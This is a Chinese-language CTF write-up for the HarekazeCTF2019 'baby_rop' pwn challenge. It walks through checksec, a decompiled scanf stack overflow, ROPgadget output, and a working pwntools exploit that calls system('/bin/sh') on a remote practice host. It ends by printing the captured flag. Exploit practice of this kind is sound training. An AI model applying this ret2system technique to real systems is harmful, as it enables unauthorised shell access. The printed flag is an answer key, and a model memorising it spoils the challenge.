---
title: HarekazeCTF2019 baby_rop
date: 2023-10-24
categories:
  - CTF
  - Pwn
---

## 前置工作

先 CheckSec，结果如下

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ checksec babyrop            
[*] '/home/ela/Pwn/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

开启了 NX，其他没啥

用 IDA 64 打开主程序

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[16]; // [rsp+0h] [rbp-10h] BYREF

  system("echo -n \"What's your name? \"");
  __isoc99_scanf("%s", v4);
  printf("Welcome to the Pwn World, %s!\n", v4);
  return 0;
}
```

溢出点就是 `__isoc99_scanf("%s", v4);`，有 `system()` 函数了，再按一下 Shift + F12 找一下 `/bin/sh` 字符串，发现程序里面真有，`/bin/sh` 地址是 `0x601048`，于是想着构建 ROP 链

## 获得 `pop rdi; ret`

使用 ROPgadget 获取所需要的地址

```bash
┌──(ela㉿kali)-[~/Pwn]
└─$ ROPgadget --binary babyrop --only "pop|ret"
Gadgets information
============================================================
0x000000000040067c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040067e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400680 : pop r14 ; pop r15 ; ret
0x0000000000400682 : pop r15 ; ret
0x000000000040067b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040067f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400540 : pop rbp ; ret
0x0000000000400683 : pop rdi ; ret
0x0000000000400681 : pop rsi ; pop r15 ; ret
0x000000000040067d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400479 : ret
0x00000000004005fa : ret 0xfffe

Unique gadgets found: 12

```

由上可见，`0x400683` 即我们想要的

## 编写 Exp

```python
from pwn import *

io = remote("node4.buuoj.cn", 27876)
elf = ELF("./babyrop")
system_addr = elf.symbols["system"]
bin_sh_addr = 0x601048
pop_rdi_ret = 0x400683

payload = b"A"*(0x10+0x8) + pack(pop_rdi_ret, 64) + pack(bin_sh_addr, 64) + pack(system_addr, 64)
io.sendline(payload)

io.interactive()
```

这里绕了个弯，进去以后虽然有了权限，但你不知道在哪里，所以我们先运行命令 `find -name flag`，发现 Flag 在 `/home/babyrop/flag`，然后再 `cat /home/babyrop/flag`，得到 Flag 是 `flag{1ff121fc-9e8e-4892-8c6d-108740c7654a}`